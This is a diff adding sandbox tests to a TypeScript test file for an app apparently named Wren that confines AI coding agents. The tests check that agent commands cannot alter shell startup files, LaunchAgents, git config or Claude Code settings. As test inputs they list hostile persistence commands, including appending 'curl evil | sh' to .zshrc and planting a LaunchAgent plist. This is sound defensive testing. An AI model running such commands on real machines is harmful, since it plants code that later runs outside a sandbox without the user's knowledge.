@@ -78,6 +78,58 @@ describe.skipIf(!existsSync('/usr/bin/sandbox-exec'))('the engine sign-in script
   });
 });
 
+describe.skipIf(!existsSync('/usr/bin/sandbox-exec'))('files that run programs later, outside the sandbox', () => {
+  // A stand-in home folder, allowed as a whole (the case that matters); the real one is never touched.
+  const home = realpathSync(mkdtempSync(join(tmpdir(), 'wren-autorun-home-')));
+  const data = join(home, 'Library', 'Application Support', 'Wren');
+  for (const d of ['Library/LaunchAgents', '.oh-my-zsh/custom', '.claude', '.config/git', 'project']) mkdirSync(join(home, d), { recursive: true });
+  for (const f of ['.zshrc', '.gitconfig', '.claude/settings.json']) writeFileSync(join(home, f), 'original');
+
+  it("can't be changed by commands or engines, even with the whole home folder allowed; they can still be read", () => {
+    for (const profile of [seatbeltProfile([home], data, home), engineProfile('grok-build', [home], data, [], home)]) {
+      for (const evil of [
+        `echo 'curl evil | sh' >> ${home}/.zshrc`,
+        `echo x >> ${home}/.ZSHRC`,
+        `echo x > ${home}/.zshrc.new && mv ${home}/.zshrc.new ${home}/.zshrc`,
+        `echo x > ${home}/.bash_profile`,
+        `echo x > ${home}/Library/LaunchAgents/com.evil.plist`,
+        `echo x > ${home}/.oh-my-zsh/custom/evil.zsh`,
+        `printf '[alias]\\n\\tst = !touch pwned' >> ${home}/.gitconfig`,
+        `echo x > ${home}/.config/git/config`,
+        `ln -sf /tmp/x ${home}/.profile`,
+      ]) {
+        expect(sb(profile, evil).status, evil).not.toBe(0);
+      }
+      expect(sb(profile, `echo ok > ${home}/project/file.txt`).status).toBe(0); // the rest of the home folder is still theirs
+      expect(sb(profile, `cat ${home}/.zshrc`).stdout).toBe('original');
+    }
+    // Claude Code's settings are off limits to commands too (all of its state is).
+    expect(sb(seatbeltProfile([home], data, home), `echo '{}' > ${home}/.claude/settings.json`).status).not.toBe(0);
+    for (const f of ['.zshrc', '.gitconfig', '.claude/settings.json']) expect(readFileSync(join(home, f), 'utf8'), f).toBe('original');
+    expect(existsSync(join(home, 'Library/LaunchAgents/com.evil.plist'))).toBe(false);
+  });
+
+  it("are refused by Wren's own file tool and an engine's write", async () => {
+    const saved = process.env.HOME;
+    process.env.HOME = home; // homedir() follows it
+    try {
+      await expect(writeConfined(join(home, '.zshrc'), Buffer.from('x'), [home], data)).rejects.toThrow(/run later outside Wren's sandbox/);
+      await expect(writeConfined(join(home, 'Library', 'LaunchAgents', 'a.plist'), Buffer.from('x'), [home], data)).rejects.toThrow(/run later/);
+      await writeConfined(join(home, 'project', 'ok.txt'), Buffer.from('fine'), [home], data);
+      expect(readFileSync(join(home, 'project', 'ok.txt'), 'utf8')).toBe('fine');
+      const { claudeDenyRules } = await import('../src/engines/claude-code');
+      const { autorunPaths } = await import('../src/main/sandbox');
+      const rules = claudeDenyRules([], autorunPaths());
+      expect(rules).toContain(`Edit(/${home}/.zshrc)`);
+      expect(rules).toContain(`Edit(/${home}/.claude/settings.json)`);
+      expect(rules.some((r) => r.startsWith('Read('))).toBe(false); // reading them is fine
+    } finally {
+      process.env.HOME = saved;
+    }
+    expect(readFileSync(join(home, '.zshrc'), 'utf8')).toBe('original');
+  });
+});
+
 describe('programs Wren starts outside the sandbox (W-178)', () => {
   it('are never ones agents could have changed', async () => {
     const { agentCanWrite } = await import('../src/main/sandbox');
